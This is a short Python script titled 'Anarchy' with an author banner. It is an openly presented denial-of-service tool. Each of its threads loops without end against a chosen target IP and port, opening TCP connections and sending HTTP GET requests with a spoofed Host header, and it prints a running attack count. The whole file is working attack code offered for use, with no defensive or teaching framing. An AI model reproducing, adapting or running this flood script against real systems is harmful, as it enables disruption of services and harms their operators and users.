###########################
#       Anarchy           #
#   Author: azazelm3dj3d  #
###########################

from datetime import datetime

import sys, socket, threading

def anarchy(target_ip, port):

    # Fake IP address
    fake_ip = '192.168.0.1'

    # Hides debugging errors - comment out to see debugging info
    sys.tracebacklimit = 0

    # Define our target
    if fake_ip != None:
        # Translate hostname to IPv4
        target = socket.gethostbyname(target_ip)
        port = int(port)
    else:
        sys.exit(1)

    # Displays terminal output (banner)
    print("-" * 50)
    print("Attacking Target: {0}".format(target))
    print("Attacking Port: {0}".format(port))
    print("Time started: " + str(datetime.now()))
    print("-" * 50)
    print("""\
    ⠀⠀⠀⠀⣠⣶⡾⠏⠉⠙⠳⢦⡀⠀⠀⠀⢠⠞⠉⠙⠲⡀
    ⠀⠀⠀⣴⠿⠏⠀⠀⠀⠀⠀⠀⢳⡀ ⡏⠀⠀⠀⠀⠀ ⢷
    ⠀⠀⢠⣟⣋⡀⢀⣀⣀⡀⠀⣀⡀⣧⠀⢸⠀⠀⠀⠀⠀   ⡇
    ⠀⠀⢸⣯⡭⠁⠸⣛⣟⠆⡴⣻⡲⣿⠀⣸ Anarchy ⡇
    ⠀⠀⣟⣿⡭⠀⠀⠀⠀⠀⢱⠀⠀⣿ ⢹⠀⠀⠀⠀⠀   ⡇
    ⠀⠀⠙⢿⣯⠄⠀⠀⠀⢀⡀⠀⠀⡿⠀⡇⠀⠀⠀⠀   ⡼
    ⠀⠀⠀⠀⠹⣶⠆⠀⠀⠀⠀⠀⡴⠃⠀⠘⠤⣄ ⣠ ⠞⠀
    ⠀⠀⠀⠀⠀⢸⣷⡦⢤⡤⢤⣞⣁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⢀⣤⣴⣿⣏⠁⠀⠀⠸⣏⢯⣷⣖⣦⡀⠀⠀⠀⠀⠀⠀
    ⢀⣾⣽⣿⣿⣿⣿⠛⢲⣶⣾⢉⡷⣿⣿⠵⣿⠀⠀⠀⠀⠀⠀
    ⣼⣿⠍⠉⣿⡭⠉⠙⢺⣇⣼⡏⠀⠀⠀⣄⢸⠀⠀⠀⠀⠀⠀
    ⣿⣿⣧⣀⣿.........⣀⣰⣏⣘⣆⣀
    """)

    print("Author: azazelm3dj3d: https://github.com/azazelm3dj3d")

    # ANARCHY TIME
    def run_socket():
        attack_num = 0

        while True:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
            s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))

            attack_num += 1
            print(attack_num)
            
            s.close()

    # Loops entire attack on the server being targeted
    for _ in range(2):
        thread = threading.Thread(target=run_socket)
        thread.start()
